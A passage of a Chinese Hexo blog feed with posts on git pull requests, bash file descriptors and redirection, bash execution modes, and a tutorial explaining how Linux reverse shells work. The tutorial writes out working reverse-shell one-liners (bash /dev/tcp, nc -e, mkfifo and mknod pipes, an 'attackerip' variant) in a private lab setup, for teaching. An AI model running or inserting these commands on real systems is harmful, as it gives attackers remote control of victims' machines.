&lt;远程主机名&gt; &lt;本地分支名&gt;:&lt;远程分支名&gt;</code></pre><p>比如：</p><pre><code class="hljs">git push origin K0rz3n-branch:master</code></pre><h2 id="PR-的基本流程"><a href="#PR-的基本流程" class="headerlink" title="PR 的基本流程"></a><strong>PR 的基本流程</strong></h2><p>1.fork 对方的项目到自己的仓库</p><p>2.在本地找一个文件夹，使用 git clone 命令将fork下来放在自己远程仓库上的项目clone 到本地，成为本地仓库</p><p>3.进入该目录与原始项目建立连接 </p><pre><code class="hljs">git remote add upstream 项目地址git remote -v 查看</code></pre><p>4.创建并 新的分支</p><pre><code class="hljs">git checkout -b 名称</code></pre><p>5.在本地进行任意的修改</p><p>6.git add 、 git commit -m 、 git pull 、git push</p><p>7.github 上可以看到到我们新提交上来的分支了</p><p>8.我们直接 New pull request 、 Create pull request 处理好冲突，写上我们添加或者修改的摘要</p><h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>git 作为一个分布式开源版本控制系统已经为世界广泛使用，掌握其基本的操作并能完成多人合作的项目已经是程序员必不可少的技能。</p><h2 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h2><p><a href="https://www.liaoxuefeng.com/wiki/0013739516305929606dd18361248578c67b8067c8c017b000">https://www.liaoxuefeng.com/wiki/0013739516305929606dd18361248578c67b8067c8c017b000</a></p><p><a href="https://blog.csdn.net/vim_wj/article/details/78300239">https://blog.csdn.net/vim_wj/article/details/78300239</a></p>]]></content>
    
    
    <categories>
      
      <category>开发</category>
      
    </categories>
    
    
    <tags>
      
      <tag>开发 Github 备忘</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux 反弹shell（二）反弹shell的本质</title>
    <link href="/2018/08/05/Linux%20%E5%8F%8D%E5%BC%B9shell%20%EF%BC%88%E4%BA%8C%EF%BC%89%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E6%9C%AC%E8%B4%A8/"/>
    <url>/2018/08/05/Linux%20%E5%8F%8D%E5%BC%B9shell%20%EF%BC%88%E4%BA%8C%EF%BC%89%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E6%9C%AC%E8%B4%A8/</url>
    
    <content type="html"><![CDATA[<h2 id="0X00-前言"><a href="#0X00-前言" class="headerlink" title="0X00 前言"></a><strong>0X00 前言</strong></h2><p>在上一篇文章 <a href="www.k0rz3n.com/2018/08/05/Linux%E5%8F%8D%E5%BC%B9shell%EF%BC%88%E4%B8%80%EF%BC%89%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E4%B8%8E%E9%87%8D%E5%AE%9A%E5%90%91">Linux反弹shell（一）文件描述符与重定向</a>，我们已经讨论过了反弹shell中最核心也是相对较难理解的部分，那么接下来我们就可以正式借反弹shell的实例分析回顾前一篇文章讲的知识，并且也加深对反弹shell的理解吧。</p><h2 id="0X01-什么是反弹shell"><a href="#0X01-什么是反弹shell" class="headerlink" title="0X01 什么是反弹shell"></a><strong>0X01 什么是反弹shell</strong></h2><p>reverse shell，就是控制端监听在某TCP&#x2F;UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。reverse shell与telnet，ssh等标准shell对应，本质上是网络概念的客户端与服务端的角色反转。</p><span id="more"></span><h2 id="0X02-为什么要反弹shell"><a href="#0X02-为什么要反弹shell" class="headerlink" title="0X02 为什么要反弹shell"></a><strong>0X02 为什么要反弹shell</strong></h2><p>通常用于被控端因防火墙受限、权限不足、端口被占用等情形</p><p>假设我们攻击了一台机器，打开了该机器的一个端口，攻击者在自己的机器去连接目标机器（目标ip：目标机器端口），这是比较常规的形式，我们叫做正向连接。远程桌面，web服务，ssh，telnet等等，都是正向连接。那么什么情况下正向连接不太好用了呢？</p><p>1.某客户机中了你的网马，但是它在局域网内，你直接连接不了。</p><p>2.它的ip会动态改变，你不能持续控制。</p><p>3.由于防火墙等限制，对方机器只能发送请求，不能接收请求。</p><p>4.对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机，都是未知，所以建立一个服务端，让恶意程序主动连接，才是上策。</p><p>那么反弹就很好理解了， 攻击者指定服务端，受害者主机主动连接攻击者的服务端程序，就叫反弹连接。</p><h2 id="0X03-反弹shell的本质是什么"><a href="#0X03-反弹shell的本质是什么" class="headerlink" title="0X03 反弹shell的本质是什么"></a><strong>0X03 反弹shell的本质是什么</strong></h2><p>我们可以先以一个linux 下的反弹shell 的命令为例来看一下反弹shell 的命令都做了些什么，掌握了反弹的本质，再多的方法其实只是换了包装而已。</p><p><strong>实验环境：</strong></p><p><strong>受害者：</strong></p><p>Ubuntu Linux ——&gt; 192.168.146.128 </p><p><strong>攻击者：</strong></p><p>Kali Linux   ——&gt; 192.168.146.129</p><p>我们就以最常见的bash为例：<br>attacker机器上执行：</p><pre><code class="hljs">nc -lvp 2333</code></pre><p>victim 机器上执行：</p><pre><code class="hljs">bash -i &gt;&amp; /dev/tcp/192.168.146.129/2333 0&gt;&amp;1</code></pre><p>你就会看到下图：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%8F%8D%E5%BC%B9shell1.png" alt="此处输入图片的描述"></p><p>可以看到在攻击机上出现了受害者机器的shell</p><p>解释一下这条命令具体的含义：</p><p><strong>1.bash -i</strong> </p><p>1）bash 是linux 的一个比较常见的shell,其实linux的shell还有很多，比如 sh、zsh、等，他们之间有着细小差别</p><p>2）-i 这个参数表示的是产生交互式的shell</p><p><strong>2.&#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port</strong></p><p>&#x2F;dev&#x2F;tcp|udp&#x2F;ip&#x2F;port 这个文件是特别特殊的，实际上可以将其看成一个设备（Linux下一切皆文件），其实如果你访问这个文件的位置他是不存在的，如下图：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%8F%8D%E5%BC%B9shell2.png" alt="此处输入图片的描述"></p><p>但是如果你在一方监听端口的情况下对这个文件进行读写，就能实现与监听端口的服务器的socket通信</p><p><strong>实例1：</strong></p><p>我们输出字符串到这个文件里</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%8F%8D%E5%BC%B9shell3.png" alt="此处输入图片的描述"></p><p>攻击机上的输出</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%8F%8D%E5%BC%B9shell4.png" alt="此处输入图片的描述"></p><p><strong>实例2：</strong></p><p>攻击机上的输入</p><p> <img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%8F%8D%E5%BC%B9shell5.png" alt="此处输入图片的描述"></p><p>受害者机器上的输出</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%8F%8D%E5%BC%B9shell6.png" alt="此处输入图片的描述"></p><p><strong>3.交互重定向</strong></p><p><strong>注意：</strong><br>下面的内容涉及到比较复杂的重定向和文件描述符的知识，如果理解不够深入建议看完我的上一篇文章以后再来继续阅读：</p><p><strong>文章链接：</strong></p><p><a href="www.k0rz3n.com/2018/08/05/Linux%E5%8F%8D%E5%BC%B9shell%EF%BC%88%E4%B8%80%EF%BC%89%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E4%B8%8E%E9%87%8D%E5%AE%9A%E5%90%91/">Linux反弹shell（一）文件描述符与重定向</a></p><p>为了实现交互，我们需要把受害者交互式shell的输出重定向到攻击机上<br>在受害者机器上输入</p><pre><code class="hljs">bash -i &gt; /dev/tcp/192.168.146.129/2333</code></pre><p>示意图：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%8F%8D%E5%BC%B9shell%E9%87%8D%E5%AE%9A%E5%90%91%E7%A4%BA%E6%84%8F%E5%9B%BE1.png" alt="此处输入图片的描述"></p><p>如下图所示，任何在受害者机器上执行的指令都不会直接回显了，而是在攻击者机器上回显。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%8F%8D%E5%BC%B9shell7.png" alt="此处输入图片的描述"></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%8F%8D%E5%BC%B9shell8.png" alt="此处输入图片的描述"></p><p>但是这里有一个问题，攻击者没有能够实现对受害者的控制，攻击者执行的命令没法在受害者电脑上执行。</p><p>于是我们似乎还需要一条这样的指令</p><pre><code class="hljs">bash -i &lt; /dev/tcp/192.168.146.129/2333</code></pre><p>示意图：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%8F%8D%E5%BC%B9shell%E9%87%8D%E5%AE%9A%E5%90%91%E7%A4%BA%E6%84%8F%E5%9B%BE2.png" alt="此处输入图片的描述"></p><p>这条指令的意思是将攻击者输入的命令输入给受害者的bash，自然就能执行了</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%8F%8D%E5%BC%B9shell11.png" alt="此处输入图片的描述"></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%8F%8D%E5%BC%B9shell12.png" alt="此处输入图片的描述"></p><p>现在我们需要将两条指令结合起来（如果这条指令看不懂可以去看一下我上面提供的文章的链接再回来看这条指令）：</p><pre><code class="hljs">bash -i &gt; /dev/tcp/192.168.146.129/2333 0&gt;&amp;1</code></pre><p>示意图：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%8F%8D%E5%BC%B9shell%E9%87%8D%E5%AE%9A%E5%90%91%E7%A4%BA%E6%84%8F%E5%9B%BE3.png" alt="此处输入图片的描述"></p><p><strong>由这张示意图可以很清楚地看到，输入0是由&#x2F;dev&#x2F;tcp&#x2F;192.168.146.129&#x2F;2333 输入的，也就是攻击机的输入，命令执行的结果1，会输出到&#x2F;dev&#x2F;tcp&#x2F;192.168.156.129&#x2F;2333上，这就形成了一个回路，实现了我们远程交互式shell 的功能</strong></p><p>如下图所示，我在攻击机上输入 ifconfig，查看到的是受害者的ip ，也就是说我们目前已经基本完成了一个反弹shell 的功能。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%8F%8D%E5%BC%B9shell9.png" alt="此处输入图片的描述"></p><p><strong>注意：</strong><br>但是这里有一个问题，就是我们在受害者机器上依然能看到我们在攻击者机器中执行的指令 ，如下图所示，我们马上解决</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%8F%8D%E5%BC%B9shell10.png" alt="此处输入图片的描述"></p><p><strong>4. &gt;&amp;、&amp;&gt;</strong></p><p>这个符号在我附上链接的那篇文章中也提到了，作用就是混合输出（错误、正确输出都输出到一个地方）</p><p>现在我们解决一下前面的问题：</p><pre><code class="hljs"> bash -i &gt; /dev/tcp/192.168.146.129/2333 0&gt;&amp;1 2&gt;&amp;1</code></pre><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%8F%8D%E5%BC%B9shell17.png" alt="此处输入图片的描述"></p><p>可以看到命令并没有回显在受害者机器上，我们的目的达成了</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%8F%8D%E5%BC%B9shell15.png" alt="此处输入图片的描述"></p><p>当然我们也可以执行与之完全等价的指令</p><pre><code class="hljs">bash -i &gt;&amp; /dev/tcp/192.168.146.129/2333 0&gt;&amp;1</code></pre><p><strong>至此，我们的反弹shell的经典语句就分析完了，通过这条语句的分析我们能大致的了解反弹shell的本质，以后碰到其他的反弹shell 的语句也能用类似的分析方法区分析，甚至我们也可以自己举一反三创造更加绝妙的反弹shell 的语句</strong></p><h2 id="0X04-常见的反弹shell-的语句怎么理解"><a href="#0X04-常见的反弹shell-的语句怎么理解" class="headerlink" title="0X04 常见的反弹shell 的语句怎么理解"></a><strong>0X04 常见的反弹shell 的语句怎么理解</strong></h2><h3 id="1-方法一"><a href="#1-方法一" class="headerlink" title="1.方法一"></a><strong>1.方法一</strong></h3><pre><code class="hljs">bash -i&gt;&amp; /dev/tcp/192.168.146.129/2333 0&gt;&amp;1</code></pre><p>和</p><pre><code class="hljs">bash -i&gt;&amp; /dev/tcp/192.168.146.129/2333 0&lt;&amp;1</code></pre><p>这里的唯一区别就是 0&gt;&amp;1 和 0&lt;&amp;1 ，其实就是打开方式的不同，而对于这个文件描述符来讲并没有什么区别（我在上面给出链接的文章中也特地用加粗的形式解释了）</p><h3 id="2-方法二"><a href="#2-方法二" class="headerlink" title="2.方法二"></a><strong>2.方法二</strong></h3><pre><code class="hljs">bash -i &gt;&amp; /dev/tcp/192.168.146.129/2333 &lt;&amp;2</code></pre><p>等价于 </p><pre><code class="hljs">bash -i &gt;&amp; /dev/tcp/192.168.146.129/2333 0&lt;&amp;2</code></pre><p>示意图：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%8F%8D%E5%BC%B9shell%E9%87%8D%E5%AE%9A%E5%90%91%E7%A4%BA%E6%84%8F%E5%9B%BE4.png" alt="此处输入图片的描述"></p><h3 id="3-方法三"><a href="#3-方法三" class="headerlink" title="3.方法三"></a><strong>3.方法三</strong></h3><pre><code class="hljs">exec 5&lt;&gt;/dev/tcp/192.168.146.129/2333;cat &lt;&amp;5|while read line;do $line &gt;&amp;5 2&gt;&amp;1;done</code></pre><p><strong>简单的解释一下：</strong></p><pre><code class="hljs">exec 5&lt;&gt;/dev/tcp/192.168.146.129/2333</code></pre><p>这一句将文件描述符5重定向到了 &#x2F;dev&#x2F;tcp&#x2F;192.168.146.129&#x2F;2333 并且方式是<strong>读写方式</strong>（这种方法在我的前面的文章中也讲到过，<strong>传送门</strong>），于是我们就能通过文件描述符对这个socket连接进行操作了</p><pre><code class="hljs">command|while read line do .....done</code></pre><p>这个是一个非常经典的句子，它的原句是这样的</p><pre><code class="hljs">while read linedo       …done &lt; file</code></pre><p>从文件中依次读取每一行，将其赋值给 line 变量（当然这里变量可以很多，以空格分隔，这里我就举一个变量的例子，如果是一个变量的话，那么一整行都是它的了），之后再在循环中对line进行操作。</p><p>而现在我们不是从file 文件中输入了，我们使用管道符对攻击者机器上输入的命令依次执行，并将标准输出和标准错误输出都重定向到了文件描述符5，也就是攻击机上，实现交互式shell的功能。</p><p>与之完全类似的还有下面这条指令，读者有兴趣可以自己分析一下：</p><pre><code class="hljs">0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/attackerip/4444; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</code></pre><h3 id="4-方法四"><a href="#4-方法四" class="headerlink" title="4.方法四"></a><strong>4.方法四</strong></h3><p>nc 如果安装了正确的版本（存在-e 选项就能直接反弹shell）</p><pre><code class="hljs">nc -e /bin/sh 192.168.146.129 2333</code></pre><p>但是如果是没有-e 选项是不是就不能实现了呢？当然不是，我们可以向下面这样</p><pre><code class="hljs">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.146.129 2333 &gt;/tmp/f</code></pre><p><strong>简单的解释：</strong></p><p>mkfifo 命令首先创建了一个管道，cat 将管道里面的内容输出传递给&#x2F;bin&#x2F;sh，sh会执行管道里的命令并将标准输出和标准错误输出结果通过nc 传到该管道，由此形成了一个回路</p><p>类似的命令：</p><pre><code class="hljs">mknod backpipe p; nc 192.168.146.129 2333 0&lt;backpipe | /bin/bash 1&gt;backpipe 2&gt;backpipe</code></pre><h2 id="0X05-总结"><a href="#0X05-总结" class="headerlink" title="0X05 总结"></a><strong>0X05 总结</strong></h2><p>反弹shell方法虽然常见，方法网上一搜就是一大把的代码，但是很少有人会去仔细斟酌反弹shell的原理，我也看到有类似的文章，但是可能是由于篇幅原因并没有对文件描述符和重定向的部分做深入的讨论，导致解释语句的时候依然让人不好理解，于是这次我分成了两篇有所关联的文章彻底的剖析了一下，个人认为这个原理是非常值得大家思考的，也很有趣，如果我的文章有什么地方有问题，希望大家及时联系我。</p><h2 id="0X06-参考链接"><a href="#0X06-参考链接" class="headerlink" title="0X06 参考链接"></a><strong>0X06 参考链接</strong></h2><p><a href="https://www.cnblogs.com/r00tgrok/p/reverse_shell_cheatsheet.html">https://www.cnblogs.com/r00tgrok/p/reverse_shell_cheatsheet.html</a><br><a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a><br><a href="https://blog.csdn.net/roler_/article/details/17504039">https://blog.csdn.net/roler_/article/details/17504039</a><br><a href="http://www.freebuf.com/articles/system/153986.html">http://www.freebuf.com/articles/system/153986.html</a><br><a href="https://www.zhihu.com/question/24503813">https://www.zhihu.com/question/24503813</a></p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux 渗透测试 备忘</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux反弹shell（一）文件描述符与重定向</title>
    <link href="/2018/08/05/Linux%E5%8F%8D%E5%BC%B9shell%EF%BC%88%E4%B8%80%EF%BC%89%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E4%B8%8E%E9%87%8D%E5%AE%9A%E5%90%91/"/>
    <url>/2018/08/05/Linux%E5%8F%8D%E5%BC%B9shell%EF%BC%88%E4%B8%80%EF%BC%89%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E4%B8%8E%E9%87%8D%E5%AE%9A%E5%90%91/</url>
    
    <content type="html"><![CDATA[<h2 id="0X00-前言"><a href="#0X00-前言" class="headerlink" title="0X00 前言"></a><strong>0X00 前言</strong></h2><p>由于在反弹shell的过程中有一些非常精简的语句，但是一直没有深入理解，只是作为一个伸手党&#x2F;搬运工，于是下定决心要将其弄明白，而这里面最难的也就是文件描述符和重定向的部分，因此我特地写一篇文章单独解释这个问题。</p><span id="more"></span><h2 id="0X01-文件描述符"><a href="#0X01-文件描述符" class="headerlink" title="0X01 文件描述符"></a><strong>0X01 文件描述符</strong></h2><blockquote><p><strong>linux文件描述符</strong>：可以理解为linux跟踪打开文件，而分配的一个数字，这个数字有点类似c语言操作文件时候的句柄，通过句柄就可以实现文件的读写操作。</p></blockquote><p>当Linux启动的时候会默认打开三个文件描述符，分别是：</p><p>标准输入standard input 0 （默认设备键盘）<br>标准输出standard output 1（默认设备显示器）<br>错误输出：error output 2（默认设备显示器）</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E9%87%8D%E5%AE%9A%E5%90%911.png" alt="重定向1.png"></p><h3 id="注意："><a href="#注意：" class="headerlink" title="注意："></a><strong>注意：</strong></h3><p>（1）以后再打开文件，描述符可以依次增加<br>（2）一条shell命令，都会继承其父进程的文件描述符，因此所有的shell命令，都会默认有三个文件描述符。</p><p><strong>文件所有输入输出都是由该进程所有打开的文件描述符控制的。（Linux一切皆文件，就连键盘显示器设备都是文件，因此他们的输入输出也是由文件描述符控制）</strong></p><p>一条命令执行以前先会按照默认的情况进行绑定（也就是上面所说的 0,1,2），如果我们有时候需要让输出不显示在显示器上，而是输出到文件或者其他设备，那我们就需要重定向。</p><h2 id="0X02-重定向"><a href="#0X02-重定向" class="headerlink" title="0X02 重定向"></a><strong>0X02 重定向</strong></h2><p>重定向主要分为两种(其他复杂的都是从这两种衍生而来的)：</p><p>（1）输入重定向 &lt; &lt;&lt;<br>（2）输出重定向 &gt; &gt;&gt;</p><h3 id="重点："><a href="#重点：" class="headerlink" title="重点："></a><strong>重点：</strong></h3><p>1.bash 在执行一条指令的时候，首先会检查命令中存不存在重定向的符号，如果存在那么首先将文件描述符重定向（之前说过了，输入输出操作都是依赖文件描述符实现的，重定向输入输出本质上就是重定向文件描述符），然后在把重定向去掉，执行指令</p><p>2.如果指令中存在多个重定向，那么不要随便改变顺序，因为重定向是从左向右解析的，改变顺序可能会带来完全不同的结果（这一点我们后面会展示）</p><p>3.&lt; 是对标准输入 0 重定向 ，&gt; 是对标准输出 1 重定向</p><p><strong>4.再强调一下，重定向就是针对文件描述符的操作</strong></p><h3 id="1-输入重定向"><a href="#1-输入重定向" class="headerlink" title="1.输入重定向"></a><strong>1.输入重定向</strong></h3><p>格式：  [n]&lt; word <strong>（注意[n]与&lt;之间没有空格）</strong></p><p>说明：将文件描述符 n 重定向到 word 指代的文件（以只读方式打开）,如果n省略就是0（标准输入）</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E9%87%8D%E5%AE%9A%E5%90%912.png" alt="重定向2.png"></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E9%87%8D%E5%AE%9A%E5%90%914.png" alt="重定向3.png"></p><p>解释: 解析器解析到 “&lt;” 以后会先处理重定向，将标准输入重定向到file，之后cat再从标准输入读取指令的时候，由于标准输入已经重定向到了file ，于是cat就从file中读取指令了。(<strong>有没有觉得这个其实就是C语言中的指针或者文件句柄，就是将0这个指针指向了不同的地址，自然有不同的输入</strong>)</p><p>图示:</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E9%87%8D%E5%AE%9A%E5%90%913.png" alt="重定向4.png"></p><h3 id="2-输出重定向"><a href="#2-输出重定向" class="headerlink" title="2.输出重定向"></a><strong>2.输出重定向</strong></h3><p>格式：   [n]&gt; word </p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E9%87%8D%E5%AE%9A%E5%90%915.png" alt="重定向5.png"></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E9%87%8D%E5%AE%9A%E5%90%916.png" alt="重定向6.png"></p><p>说明： 将文件描述符 n 重定向到word 指代的文件（以写的方式打开），如果n 省略则默认就是 1（标准输出）</p><p>图示：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E9%87%8D%E5%AE%9A%E5%90%917.png" alt="重定向7.png"></p><h3 id="3-标准输出与标准错误输出重定向"><a href="#3-标准输出与标准错误输出重定向" class="headerlink" title="3.标准输出与标准错误输出重定向"></a><strong>3.标准输出与标准错误输出重定向</strong></h3><p>格式： &amp;&gt; word  &gt;&amp; word</p><p>说明:将标准输出与标准错误输出都定向到word代表的文件（以写的方式打开），两种格式意义完全相同，这种格式完全等价于 &gt; word 2&gt;&amp;1 (2&gt;&amp;1 是将标准错误输出复制到标准输出，&amp;是为了区分文件1和文件描述符1的，详细的介绍后面会有)</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E9%87%8D%E5%AE%9A%E5%90%918.png" alt="重定向8.png"></p><p>解释：我们首先执行了一个错误的命令，可以看到错误提示被写入文件（正常情况下是会直接输出的），我们又执行了一条正确的指令，发现结果也输入到了文件，说明正确错误消息都能输出到文件。</p><p>图示： </p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E9%87%8D%E5%AE%9A%E5%90%919.png" alt="重定向9.png"></p><h3 id="4-文件描述符的复制"><a href="#4-文件描述符的复制" class="headerlink" title="4.文件描述符的复制"></a><strong>4.文件描述符的复制</strong></h3><p>格式： [n]&lt;&amp;[m] &#x2F; [n]&gt;&amp;[m] <strong>(这里所有字符之间不要有空格)</strong></p><p>说明：</p><p>1）这里两个<strong>都是将文件描述符 n 复制到 m</strong> ，两者的区别是，前者是以只读的形式打开，后者是以写的形式打开</p><p><strong>因此 0&lt;&amp;1 和 0&gt;&amp;1 是完全等价的（读&#x2F;写方式打开对其没有任何影响）</strong> </p><p>2）这里的&amp; 目的是为了区分数字名字的文件和文件描述符，如果没有&amp; 系统会认为是将文件描述符重定向到了一个数字作为文件名的文件，而不是一个文件描述符</p><p>这里就可以用上面的例子作为演示，将错误和正确的输出都输入到文件中</p><h3 id="重点：-1"><a href="#重点：-1" class="headerlink" title="重点："></a><strong>重点：</strong></h3><p>之前我们说过，重定向符号的顺序不能随便换，因为系统是从左到右执行的，我们下面就举一个例子</p><p>(1)cmd &gt; file 2&gt;&amp;1<br>(2)cmd 2&gt;&amp;1 &gt;file</p><p>与第一条指令类似的指令在上面我已经介绍过了，我们现在就来看看第二条指令的执行过程</p><p><strong>1.首先解析器解析到 2&gt;&amp;1</strong> </p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E9%87%8D%E5%AE%9A%E5%90%9110.png" alt="重定向10.png"></p><p><strong>2.解析器再向后解析到 “&gt;”</strong> </p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E9%87%8D%E5%AE%9A%E5%90%9111.png" alt="重定向11.png"></p><h3 id="5-exec-绑定重定向"><a href="#5-exec-绑定重定向" class="headerlink" title="5.exec 绑定重定向"></a><strong>5.exec 绑定重定向</strong></h3><p>格式：exec [n] &lt;&#x2F;&gt; file&#x2F;[n]</p><p>上面的输入输出重定向将输入和输出绑定文件或者设备以后只对当前的那条指令有效，如果需要接下来的指令都支持的话就需要使用 exec 指令</p><h3 id="重点：-2"><a href="#重点：-2" class="headerlink" title="重点："></a><strong>重点：</strong></h3><p>格式： [n]&lt;&gt;word</p><p>说明：以读写方式打开word指代的文件，并将n重定向到该文件。如果n不指定的话，默认为标准输入。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E9%87%8D%E5%AE%9A%E5%90%9112.png" alt="重定向12.png"></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E9%87%8D%E5%AE%9A%E5%90%9113.png" alt="重定向13.png"></p><h2 id="0X03-总结"><a href="#0X03-总结" class="headerlink" title="0X03 总结"></a><strong>0X03 总结</strong></h2><p>文件描述符和重定向的作用巨大，很好的体现出了Linux中一切皆文件的特性，在反弹shell建立交互通道的过程中也起到了至关重要的作用。 </p><h2 id="0X04-参考链接"><a href="#0X04-参考链接" class="headerlink" title="0X04 参考链接"></a><strong>0X04 参考链接</strong></h2><p><a href="https://blog.csdn.net/ccwwff/article/details/48519119">https://blog.csdn.net/ccwwff/article/details/48519119</a><br><a href="http://www.cnblogs.com/chengmo/archive/2010/10/20/1855805.html">http://www.cnblogs.com/chengmo/archive/2010/10/20/1855805.html</a><br><a href="http://www.178linux.com/54471">http://www.178linux.com/54471</a></p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux 渗透测试 备忘</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>五种bash执行命令的方式以及异同</title>
    <link href="/2018/08/04/%E4%BA%94%E7%A7%8Dbash%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%E7%9A%84%E6%96%B9%E5%BC%8F%E4%BB%A5%E5%8F%8A%E5%BC%82%E5%90%8C/"/>
    <url>/2018/08/04/%E4%BA%94%E7%A7%8Dbash%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%E7%9A%84%E6%96%B9%E5%BC%8F%E4%BB%A5%E5%8F%8A%E5%BC%82%E5%90%8C/</url>
    
    <content type="html"><![CDATA[<h2 id="0X01五种执行命令方式"><a href="#0X01五种执行命令方式" class="headerlink" title="0X01五种执行命令方式"></a><strong>0X01五种执行命令方式</strong></h2><p><strong>1.#!&#x2F;bin&#x2F;sh</strong><br>语法：在shell.sh的开头写入</p><pre><code class="hljs">#!/bin/sh</code></pre><p>一般的shell脚本就是这种用法。这种方法调用脚本开头的shell执行命令，子shell执行的时候, 父shell暂停运行，等待子shell运行完后返回父shell。子shell从父shell继承环境变量.但是子shell中的环境变量不会带回父 shell</p><span id="more"></span><p><strong>2.exec</strong></p><p>语法： </p><pre><code class="hljs">exec /xxx/shell.sh</code></pre><p>exec与fork不同，不需要新开一个sub-shell来执行被调用的脚本. 被调用的脚本与父脚本在同一个shell内执行。但是使用exec调用一个新脚本以后, 父脚本中exec行之后的内容就不会再执行了（相当于父shell被子shell删除）</p><p><strong>3.source或者.</strong><br>语法：</p><pre><code class="hljs">source /xxx/shell.sh. /xxx/shell.sh</code></pre><p>(1)与fork的区别是不新开一个子shell来执行被调用的脚本，而是在同一个shell中执行。所以被调用的脚本中声明的变量和环境变量, 都可以在主脚本中得到和使用。<br>(2)与 exec 的区别在于这个命令开启的子shell不会将父shell吞噬，执行完这个子shell以后还可以继续执行父shell下面的指令</p><p><strong>4.()</strong><br>语法：</p><pre><code class="hljs">( 语句；语句；语句；…… )</code></pre><p>圆括号中命令列表的命令将会运行在一个子shell中。</p><p><strong>比如：</strong></p><pre><code class="hljs">$ (cd ..;ls -l)</code></pre><p>cd ..命令改变的是子Shell的PWD，而不会影响到交互式Shell。<br>然而命令</p><pre><code class="hljs">$ cd ..;ls -l</code></pre><p>则有不同的效果，cd ..命令是直接在交互式Shell下执行的，改变交互式Shell的PWD，然这种方式相当于执行Shell脚本：</p><p><strong>5.{}</strong><br>语法：</p><pre><code class="hljs">&#123;语句；语句；……&#125;</code></pre><p>不会启动子shell</p><h2 id="0X02-参考链接"><a href="#0X02-参考链接" class="headerlink" title="0X02 参考链接"></a><strong>0X02 参考链接</strong></h2><p><a href="https://blog.csdn.net/love_hot_girl/article/details/16831203">https://blog.csdn.net/love_hot_girl/article/details/16831203</a></p><p><a href="https://www.cnblogs.com/zhaoyl/archive/2012/07/07/2580749.html">https://www.cnblogs.com/zhaoyl/archive/2012/07/07/2580749.html</a></p>]]></content>
    
    
    <categories>
      
      <category>备忘</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux 备忘</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Windows Server 2008 R2 ftp服务器搭建踩坑</title>
    <link href="/2018/07/31/Windows%20Server%202008%20R2%20ftp%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA%E8%B8%A9%E5%9D%91/"/>
    <url>/2018/07/31/Windows%20Server%202008%20R2%20ftp%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA%E8%B8%A9%E5%9D%91/</url>
    
